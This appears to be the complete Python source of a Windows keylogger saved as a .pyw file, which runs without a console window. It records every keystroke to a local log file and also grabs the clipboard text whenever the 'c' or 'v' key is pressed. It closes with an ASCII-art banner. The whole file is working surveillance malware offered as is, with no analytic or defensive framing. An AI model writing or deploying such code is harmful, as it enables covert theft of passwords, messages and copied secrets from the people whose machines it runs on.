# file: keylogger.pyw
# python: language level = 3
# make by: coder
# 32 bit
# =}
# library
import ctypes
from pynput import keyboard
from pynput.keyboard import Key
# special keys
special_keys = {
    Key.alt: " [Alt] ",
    Key.alt_l: " [Alt_L] ",
    Key.alt_r: " [Alt_R] ",
    Key.alt_gr: " [AltGr] ",
    Key.backspace: " [Backspace] ",
    Key.caps_lock: " [CapsLock] ",
    Key.cmd: " [Cmd] ",
    Key.cmd_l: " [Cmd_L] ",
    Key.cmd_r: " [Cmd_R] ",
    Key.ctrl: " [Ctrl] ",
    Key.ctrl_l: " [Ctrl_L] ",
    Key.ctrl_r: " [Ctrl_R] ",
    Key.delete: " [Delete] ",
    Key.down: " [Down] ",
    Key.end: " [End] ",
    Key.enter: " \n ",
    Key.esc: " [Esc] ",
    Key.f1: " [F1] ",
    Key.f2: " [F2] ",
    Key.f3: " [F3] ",
    Key.f4: " [F4] ",
    Key.f5: " [F5] ",
    Key.f6: " [F6] ",
    Key.f7: " [F7] ",
    Key.f8: " [F8] ",
    Key.f9: " [F9] ",
    Key.f10: " [F10] ",
    Key.f11: " [F11] ",
    Key.f12: " [F12] ",
    Key.home: " [Home] ",
    Key.left: " [Left] ",
    Key.page_down: " [PageDown] ",
    Key.page_up: " [PageUp] ",
    Key.right: " [Right] ",
    Key.shift: " [Shift] ",
    Key.shift_l: " [Shift_L] ",
    Key.shift_r: " [Shift_R] ",
    Key.space: " ",
    Key.tab: " [Tab] ",
    Key.up: " [Up] ",
    Key.insert: " [Insert] ",
    Key.menu: " [Menu] ",
    Key.num_lock: " [NumLock] ",
    Key.pause: " [Pause] ",
    Key.print_screen: " [PrintScreen] ",
    Key.scroll_lock: " [ScrollLock] "
}
pressed_keys = set()
# get clipboard
def get_clipboard():
    kernel32 = ctypes.windll.kernel32
    user32 = ctypes.windll.user32
    CF_TEXT = 1
    kernel32.GlobalLock.argtypes = [ctypes.c_void_p]
    kernel32.GlobalLock.restype = ctypes.c_void_p
    kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]
    user32.GetClipboardData.restype = ctypes.c_void_p
    user32.OpenClipboard(0)
    IsClipboardFormatAvailable = user32.IsClipboardFormatAvailable
    GetClipboardData = user32.GetClipboardData
    CloseClipboard = user32.CloseClipboard
    try:
        if IsClipboardFormatAvailable(CF_TEXT):
            data = GetClipboardData(CF_TEXT)
            data_locked = kernel32.GlobalLock(data)
            text = ctypes.c_char_p(data_locked)
            value = text.value
            kernel32.GlobalUnlock(data_locked)
            return value.decode('utf-8', errors='ignore')
    finally:
        CloseClipboard()
# log
def on_press(key):
    pressed_keys.add(key)
    with open("result.log", "a", encoding='utf-8') as file:
        try:
            if key in special_keys:
                file.write(special_keys[key])
            elif hasattr(key, 'char') and key.char and key.char.lower() in ('c', 'v'):
                clipboard_data = get_clipboard()
                if clipboard_data:
                    file.write("/n[Clipboard]: " + str(clipboard_data) + " /n ")
                else:
                    pass
            else:
                file.write(key.char)
        except AttributeError:
            file.write(str(key))
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
#  .    .  .  ..  ..     ..   .        . .  .    .         ....          ...:  .      .:.:.  .  .     .                                                           
# ~GBBBB5:.YB#GJ..JB###5~5B#G.Y#BBBB7 !P#G!^PBBBBP^     :JGB?^GB5~    ^YBB~!YGG#!  .?G#J^JPG#5 ^P####77PB#J ^PBBB#!?BBGJ:                                         
#  Y@@@@!  !#?:   :&@@@G  ^G#. P@@@@J  PG:  ?@@@@?     !&@@B  ?@@@5  J@@@Y   :G@! ^#@@#.   ?@G  7@@@@?  !&5  ?@@@@? P@@@#.                                        
#  Y@@@@~.Y@G     :&@@@G !B^:  .G@@@@?7G.   7@@@@?    :&@@@G  ?@@@@7~@@@@Y    .Y: B@@@#.    77  7@@@@? YP::  ?@@@@7 P@@@P.                                        
#  Y@@@@7B@@@Y    :&@@@P~&@:    .B@@@@J.    7@@@@?    !@@@@G  ?@@@@5J@@@@Y ?YYYJ7^@@@@#.~YYYJJ^ 7@@@@7?@B    ?@@@@7?&@BJ.                                         
#  Y@@@@!5@@@@?   :&@@@G ^P:^    ~@@@@5     7@@@@?   7!&@@@G  ?@@@@7~@@@@Y :#@@@?.B@@@#..Y@@@G  7@@@@? ?Y:^  ?@@@@7.G@@@G                                         
#  Y@@@@~.#@@@@!  :&@@@G  :5&:   ^@@@@5     7@@@@? .Y@7!&@@B  ?@@@5  J@@@Y  B@@@! ~#@@#. ?@@@P  7@@@@?  ~#G  ?@@@@? 5@@@&7^                                       
# ~G####5~P####B! Y####5~5B#B:  .Y####G!   ^P####77G##! :JG#7^GB5~    ^YBB~7#BP7.  .?G#J^G#GJ^ ^P####77P#&5 ^P####P^^G&&#P~                                       
#  . .... . .. .. ..... .....    .... ..    ..... ....     ....          ....         .:.:.     ..... ....   . .. .   ...                                         
                                                                                                                                                                                                        
                                                                                                                                                                                                        